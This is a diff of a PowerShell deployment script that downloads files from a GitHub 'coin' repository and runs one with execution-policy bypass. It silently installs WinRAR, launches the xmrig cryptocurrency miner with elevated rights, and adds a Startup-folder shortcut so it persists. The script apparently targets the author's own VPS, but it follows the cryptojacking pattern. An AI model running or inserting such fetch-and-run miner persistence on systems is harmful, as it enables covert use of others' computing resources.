@@ -1,5 +1,4 @@
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\AUTORUN_SETUP.cmd
 powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
 Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
 Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
@@ -11,7 +10,8 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/head
 Copy-Item -Path C:\XRPRUN.cmd -Destination C:\xmrig-6.22.2\XRPRUN.cmd -Force
 Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
 Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.cmd' -ArgumentList '/S' -Verb RunAs
-$source = "C:\AUTORUN_SETUP.cmd"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\xmrig-6.22.2\AUTORUN_SETUP.cmd
+$source = "C:\xmrig-6.22.2\AUTORUN_SETUP.cmd"
 $destination = "C:\Users\VPS365\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AUTORUN_SETUP.cmd.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
